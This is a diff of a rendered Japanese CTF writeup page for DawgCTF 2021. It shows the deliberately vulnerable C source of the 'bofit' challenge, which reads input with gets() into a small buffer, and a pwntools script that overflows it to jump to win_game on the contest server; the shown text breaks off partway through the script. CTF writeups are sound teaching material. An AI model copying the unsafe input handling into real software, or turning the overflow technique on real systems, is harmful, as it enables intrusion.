@@ -23,7 +23,7 @@
 <meta name="google-site-verification" content="PqctLWZQttGzxXVupWuIt2HWuBI8cvN1z07ETpxA2dw" />
 
 
-<meta name="generator" content="Hugo 0.74.2 with theme even" />
+<meta name="generator" content="Hugo 0.119.0 with theme even" />
 
 
 <link rel="canonical" href="https://captureamerica.github.io/writeups/post/dawgctf_2021/" />
@@ -35,24 +35,20 @@
 
 
 
-<link href="https://captureamerica.github.io/writeups/sass/main.min.2e81bbed97b8b282c1aeb57488cc71c8d8c8ec559f3931531bd396bf31e0d4dd.css" rel="stylesheet">
+<link href="https://captureamerica.github.io/writeups/sass/main.min.f92fd13721ddf72129410fd8250e73152cc6f2438082b6c0208dc24ee7c13fc4.css" rel="stylesheet">
 
 
 
 <meta property="og:title" content="DawgCTF 2021 Writeup" />
 <meta property="og:description" content="URL: https://umbccd.io/ 730点を獲得し、最終順位は209位でした。 以下は解いたチャレンジです。 わけがわからないチャレンジが結構あったな、というのが正直な感想で" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://captureamerica.github.io/writeups/post/dawgctf_2021/" />
+<meta property="og:url" content="https://captureamerica.github.io/writeups/post/dawgctf_2021/" /><meta property="article:section" content="post" />
 <meta property="article:published_time" content="2021-05-09T11:00:00+09:00" />
 <meta property="article:modified_time" content="2021-05-09T11:00:00+09:00" />
 <meta itemprop="name" content="DawgCTF 2021 Writeup">
-<meta itemprop="description" content="URL: https://umbccd.io/ 730点を獲得し、最終順位は209位でした。 以下は解いたチャレンジです。 わけがわからないチャレンジが結構あったな、というのが正直な感想で">
-<meta itemprop="datePublished" content="2021-05-09T11:00:00&#43;09:00" />
-<meta itemprop="dateModified" content="2021-05-09T11:00:00&#43;09:00" />
-<meta itemprop="wordCount" content="934">
-
-
-
+<meta itemprop="description" content="URL: https://umbccd.io/ 730点を獲得し、最終順位は209位でした。 以下は解いたチャレンジです。 わけがわからないチャレンジが結構あったな、というのが正直な感想で"><meta itemprop="datePublished" content="2021-05-09T11:00:00+09:00" />
+<meta itemprop="dateModified" content="2021-05-09T11:00:00+09:00" />
+<meta itemprop="wordCount" content="939">
 <meta itemprop="keywords" content="CTF," /><meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="DawgCTF 2021 Writeup"/>
 <meta name="twitter:description" content="URL: https://umbccd.io/ 730点を獲得し、最終順位は209位でした。 以下は解いたチャレンジです。 わけがわからないチャレンジが結構あったな、というのが正直な感想で"/>
@@ -197,7 +193,7 @@
 <p>以下、ソースコードの中身です。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -279,94 +275,94 @@
 </span><span class="lnt">80
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-C" data-lang="C"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
-</span><span class="cp">#include</span> <span class="cpf">&lt;stdbool.h&gt;</span><span class="cp">
-</span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
-</span><span class="cp">#include</span> <span class="cpf">&lt;time.h&gt;</span><span class="cp">
-</span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
-</span><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
-</span><span class="cp"></span>
-<span class="kt">void</span> <span class="nf">win_game</span><span class="p">(){</span>
-	<span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
-	<span class="n">FILE</span><span class="o">*</span> <span class="n">fptr</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">&#34;flag.txt&#34;</span><span class="p">,</span> <span class="s">&#34;r&#34;</span><span class="p">);</span>
-	<span class="n">fgets</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="n">fptr</span><span class="p">);</span>
-	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;%s&#34;</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
-<span class="p">}</span>
-
-<span class="kt">int</span> <span class="nf">play_game</span><span class="p">(){</span>
-	<span class="kt">char</span> <span class="n">c</span><span class="p">;</span>
-	<span class="kt">char</span> <span class="n">input</span><span class="p">[</span><span class="mi">20</span><span class="p">];</span>
-	<span class="kt">int</span> <span class="n">choice</span><span class="p">;</span>
-	<span class="kt">bool</span> <span class="n">correct</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
-	<span class="kt">int</span> <span class="n">score</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
-	<span class="n">srand</span><span class="p">(</span><span class="n">time</span><span class="p">(</span><span class="mi">0</span><span class="p">));</span>
-	<span class="k">while</span><span class="p">(</span><span class="n">correct</span><span class="p">){</span>
-		<span class="n">choice</span> <span class="o">=</span> <span class="n">rand</span><span class="p">()</span> <span class="o">%</span> <span class="mi">4</span><span class="p">;</span>
-		<span class="k">switch</span><span class="p">(</span><span class="n">choice</span><span class="p">){</span>
-			<span class="k">case</span> <span class="mi">0</span><span class="o">:</span>
-				<span class="n">printf</span><span class="p">(</span><span class="s">&#34;BOF it!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
-				<span class="n">c</span> <span class="o">=</span> <span class="n">getchar</span><span class="p">();</span>
-				<span class="k">if</span><span class="p">(</span><span class="n">c</span> <span class="o">!=</span> <span class="sc">&#39;B&#39;</span><span class="p">)</span> <span class="n">correct</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
-				<span class="k">while</span><span class="p">((</span><span class="n">c</span> <span class="o">=</span> <span class="n">getchar</span><span class="p">())</span> <span class="o">!=</span> <span class="sc">&#39;\n&#39;</span> <span class="o">&amp;&amp;</span> <span class="n">c</span> <span class="o">!=</span> <span class="n">EOF</span><span class="p">);</span>
-				<span class="k">break</span><span class="p">;</span>
-
-			<span class="k">case</span> <span class="mi">1</span><span class="o">:</span>
-				<span class="n">printf</span><span class="p">(</span><span class="s">&#34;Pull it!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
-				<span class="n">c</span> <span class="o">=</span> <span class="n">getchar</span><span class="p">();</span>
-				<span class="k">if</span><span class="p">(</span><span class="n">c</span> <span class="o">!=</span> <span class="sc">&#39;P&#39;</span><span class="p">)</span> <span class="n">correct</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
-				<span class="k">while</span><span class="p">((</span><span class="n">c</span> <span class="o">=</span> <span class="n">getchar</span><span class="p">())</span> <span class="o">!=</span> <span class="sc">&#39;\n&#39;</span> <span class="o">&amp;&amp;</span> <span class="n">c</span> <span class="o">!=</span> <span class="n">EOF</span><span class="p">);</span>
-				<span class="k">break</span><span class="p">;</span>
-
-			<span class="k">case</span> <span class="mi">2</span><span class="o">:</span>
-				<span class="n">printf</span><span class="p">(</span><span class="s">&#34;Twist it!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
-				<span class="n">c</span> <span class="o">=</span> <span class="n">getchar</span><span class="p">();</span>
-				<span class="k">if</span><span class="p">(</span><span class="n">c</span> <span class="o">!=</span> <span class="sc">&#39;T&#39;</span><span class="p">)</span> <span class="n">correct</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
-				<span class="k">while</span><span class="p">((</span><span class="n">c</span> <span class="o">=</span> <span class="n">getchar</span><span class="p">())</span> <span class="o">!=</span> <span class="sc">&#39;\n&#39;</span> <span class="o">&amp;&amp;</span> <span class="n">c</span> <span class="o">!=</span> <span class="n">EOF</span><span class="p">);</span>
-				<span class="k">break</span><span class="p">;</span>
-
-			<span class="k">case</span> <span class="mi">3</span><span class="o">:</span>
-				<span class="n">printf</span><span class="p">(</span><span class="s">&#34;Shout it!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
-				<span class="n">gets</span><span class="p">(</span><span class="n">input</span><span class="p">);</span>
-				<span class="k">if</span><span class="p">(</span><span class="n">strlen</span><span class="p">(</span><span class="n">input</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">10</span><span class="p">)</span> <span class="n">correct</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
-				<span class="k">break</span><span class="p">;</span>
-		<span class="p">}</span>
-		<span class="n">score</span><span class="o">++</span><span class="p">;</span>
-	<span class="p">}</span>
-	<span class="k">return</span> <span class="n">score</span><span class="p">;</span>
-<span class="p">}</span>
-
-<span class="kt">void</span> <span class="nf">welcome</span><span class="p">(){</span>
-	<span class="kt">char</span> <span class="n">input</span><span class="p">;</span>
-	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;Welcome to BOF it! The game featuring 4 hilarious commands to keep players on their toes</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
-	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;You&#39;ll have a second to respond to a series of commands</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
-	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;BOF it: Reply with a capital </span><span class="se">\&#39;</span><span class="s">B</span><span class="se">\&#39;\n</span><span class="s">&#34;</span><span class="p">);</span>
-	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;Pull it: Reply with a capital </span><span class="se">\&#39;</span><span class="s">P</span><span class="se">\&#39;\n</span><span class="s">&#34;</span><span class="p">);</span>
-	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;Twist it: Reply with a capital </span><span class="se">\&#39;</span><span class="s">T</span><span class="se">\&#39;\n</span><span class="s">&#34;</span><span class="p">);</span>
-	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;Shout it: Reply with a string of at least 10 characters</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
-	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;BOF it to start!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
-	<span class="n">input</span> <span class="o">=</span> <span class="n">getchar</span><span class="p">();</span>
-	<span class="k">while</span><span class="p">(</span><span class="n">input</span> <span class="o">!=</span> <span class="sc">&#39;B&#39;</span><span class="p">){</span>
-		<span class="n">printf</span><span class="p">(</span><span class="s">&#34;BOF it to start!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
-		<span class="n">input</span> <span class="o">=</span> <span class="n">getchar</span><span class="p">();</span>
-	<span class="p">}</span>
-	<span class="k">while</span><span class="p">((</span><span class="n">input</span> <span class="o">=</span> <span class="n">getchar</span><span class="p">())</span> <span class="o">!=</span> <span class="sc">&#39;\n&#39;</span> <span class="o">&amp;&amp;</span> <span class="n">input</span> <span class="o">!=</span> <span class="n">EOF</span><span class="p">);</span>
-<span class="p">}</span>
-
-<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
-	<span class="kt">int</span> <span class="n">score</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
-	<span class="n">welcome</span><span class="p">();</span>
-	<span class="n">score</span> <span class="o">=</span> <span class="n">play_game</span><span class="p">();</span>
-	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;Congrats! Final score: %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">score</span><span class="p">);</span>
-	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-<span class="p">}</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdbool.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;time.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">win_game</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">	<span class="n">FILE</span><span class="o">*</span> <span class="n">fptr</span> <span class="o">=</span> <span class="nf">fopen</span><span class="p">(</span><span class="s">&#34;flag.txt&#34;</span><span class="p">,</span> <span class="s">&#34;r&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">fgets</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="n">fptr</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%s&#34;</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">play_game</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">char</span> <span class="n">c</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">char</span> <span class="n">input</span><span class="p">[</span><span class="mi">20</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">int</span> <span class="n">choice</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">bool</span> <span class="n">correct</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">int</span> <span class="n">score</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">srand</span><span class="p">(</span><span class="nf">time</span><span class="p">(</span><span class="mi">0</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">	<span class="k">while</span><span class="p">(</span><span class="n">correct</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">		<span class="n">choice</span> <span class="o">=</span> <span class="nf">rand</span><span class="p">()</span> <span class="o">%</span> <span class="mi">4</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="k">switch</span><span class="p">(</span><span class="n">choice</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">			<span class="k">case</span> <span class="mi">0</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">				<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;BOF it!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">				<span class="n">c</span> <span class="o">=</span> <span class="nf">getchar</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">				<span class="k">if</span><span class="p">(</span><span class="n">c</span> <span class="o">!=</span> <span class="sc">&#39;B&#39;</span><span class="p">)</span> <span class="n">correct</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">				<span class="k">while</span><span class="p">((</span><span class="n">c</span> <span class="o">=</span> <span class="nf">getchar</span><span class="p">())</span> <span class="o">!=</span> <span class="sc">&#39;\n&#39;</span> <span class="o">&amp;&amp;</span> <span class="n">c</span> <span class="o">!=</span> <span class="n">EOF</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">				<span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">			<span class="k">case</span> <span class="mi">1</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">				<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Pull it!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">				<span class="n">c</span> <span class="o">=</span> <span class="nf">getchar</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">				<span class="k">if</span><span class="p">(</span><span class="n">c</span> <span class="o">!=</span> <span class="sc">&#39;P&#39;</span><span class="p">)</span> <span class="n">correct</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">				<span class="k">while</span><span class="p">((</span><span class="n">c</span> <span class="o">=</span> <span class="nf">getchar</span><span class="p">())</span> <span class="o">!=</span> <span class="sc">&#39;\n&#39;</span> <span class="o">&amp;&amp;</span> <span class="n">c</span> <span class="o">!=</span> <span class="n">EOF</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">				<span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">			<span class="k">case</span> <span class="mi">2</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">				<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Twist it!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">				<span class="n">c</span> <span class="o">=</span> <span class="nf">getchar</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">				<span class="k">if</span><span class="p">(</span><span class="n">c</span> <span class="o">!=</span> <span class="sc">&#39;T&#39;</span><span class="p">)</span> <span class="n">correct</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">				<span class="k">while</span><span class="p">((</span><span class="n">c</span> <span class="o">=</span> <span class="nf">getchar</span><span class="p">())</span> <span class="o">!=</span> <span class="sc">&#39;\n&#39;</span> <span class="o">&amp;&amp;</span> <span class="n">c</span> <span class="o">!=</span> <span class="n">EOF</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">				<span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">			<span class="k">case</span> <span class="mi">3</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">				<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Shout it!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">				<span class="nf">gets</span><span class="p">(</span><span class="n">input</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">				<span class="k">if</span><span class="p">(</span><span class="nf">strlen</span><span class="p">(</span><span class="n">input</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">10</span><span class="p">)</span> <span class="n">correct</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">				<span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">		<span class="n">score</span><span class="o">++</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="n">score</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">welcome</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">char</span> <span class="n">input</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Welcome to BOF it! The game featuring 4 hilarious commands to keep players on their toes</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;You&#39;ll have a second to respond to a series of commands</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;BOF it: Reply with a capital </span><span class="se">\&#39;</span><span class="s">B</span><span class="se">\&#39;\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Pull it: Reply with a capital </span><span class="se">\&#39;</span><span class="s">P</span><span class="se">\&#39;\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Twist it: Reply with a capital </span><span class="se">\&#39;</span><span class="s">T</span><span class="se">\&#39;\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Shout it: Reply with a string of at least 10 characters</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;BOF it to start!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="n">input</span> <span class="o">=</span> <span class="nf">getchar</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">	<span class="k">while</span><span class="p">(</span><span class="n">input</span> <span class="o">!=</span> <span class="sc">&#39;B&#39;</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">		<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;BOF it to start!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="n">input</span> <span class="o">=</span> <span class="nf">getchar</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="k">while</span><span class="p">((</span><span class="n">input</span> <span class="o">=</span> <span class="nf">getchar</span><span class="p">())</span> <span class="o">!=</span> <span class="sc">&#39;\n&#39;</span> <span class="o">&amp;&amp;</span> <span class="n">input</span> <span class="o">!=</span> <span class="n">EOF</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">int</span> <span class="n">score</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">welcome</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">	<span class="n">score</span> <span class="o">=</span> <span class="nf">play_game</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Congrats! Final score: %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">score</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
 </div>
-</div><p><br /></p>
+</div><br />
 <h3 id="solution">Solution</h3>
 <p>play_game()関数の中にBOFの脆弱性が存在します。</p>
 <p>そこに辿り着く前に、まず&rsquo;B&rsquo;を送って、次に &ldquo;Shout it&rdquo; が出るまで &lsquo;B&rsquo;, &lsquo;P&rsquo;, または &lsquo;T&rsquo; を送り続ける必要があります。</p>
 <p>あとは、BOFを発生させて win_game() に飛ぶだけです。</p>
-<p><br /></p>
+<br />
 <pre>
 $ checksec bofit
 [*] '/home/captureamerica/Mac_Downloads/bofit'
@@ -377,16 +373,16 @@ $ checksec bofit
     PIE:      No PIE (0x400000)
     RWX:      Has RWX segments
 </pre>
-<p><br />
-win_game()のアドレスは以下の通りです。gdbのi funcで確認してます。No PIEなので、これは固定です。</p>
+<br />
+win_game()のアドレスは以下の通りです。gdbのi funcで確認してます。No PIEなので、これは固定です。
 <pre>
 0x0000000000401256  win_game
 </pre>
-<p><br /></p>
+<br />
 <p>書いたコード。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -420,43 +416,43 @@ win_game()のアドレスは以下の通りです。gdbのi funcで確認して�
 </span><span class="lnt">32
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-Python" data-lang="Python"><span class="ch">#!/usr/bin/env python</span>
-<span class="c1"># -*- coding:utf-8 -*-</span>
-
-<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
-
-<span class="k">if</span> <span class="mi">0</span><span class="p">:</span>
-    <span class="n">s</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./bofit&#39;</span><span class="p">)</span>
-<span class="k">else</span><span class="p">:</span>
-    <span class="n">host</span><span class="p">,</span> <span class="n">port</span> <span class="o">=</span> <span class="s1">&#39;umbccd.io&#39;</span><span class="p">,</span> <span class="mi">4100</span>
-    <span class="n">s</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
-
-<span class="n">s</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;BOF it to start!</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
-<span class="n">s</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;B&#39;</span><span class="p">)</span>
-
-<span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
-    <span class="n">msg</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
-    <span class="k">if</span> <span class="s2">&#34;Shout it!&#34;</span> <span class="ow">in</span> <span class="n">msg</span><span class="p">:</span>
-        <span class="k">print</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
-        <span class="k">break</span>
-    <span class="n">c</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
-    <span class="n">s</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">c</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
-
-<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mi">20</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;B&#39;</span> <span class="o">*</span> <span class="mi">20</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000401256</span><span class="p">)</span>  <span class="c1"># win_game()</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000401256</span><span class="p">)</span>  <span class="c1"># win_game()</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000401256</span><span class="p">)</span>  <span class="c1"># win_game()</span>
-<span class="n">s</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
-<span class="n">msg</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span>
-<span class="k">print</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
-<span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># -*- coding:utf-8 -*-</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="mi">0</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">s</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./bofit&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">host</span><span class="p">,</span> <span class="n">port</span> <span class="o">=</span> <span class="s1">&#39;umbccd.io&#39;</span><span class="p">,</span> <span class="mi">4100</span>
+</span></span><span class="line"><span class="cl">    <span class="n">s</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;BOF it to start!</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;B&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">msg</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="s2">&#34;Shout it!&#34;</span> <span class="ow">in</span> <span class="n">msg</span><span class="p">:</span>
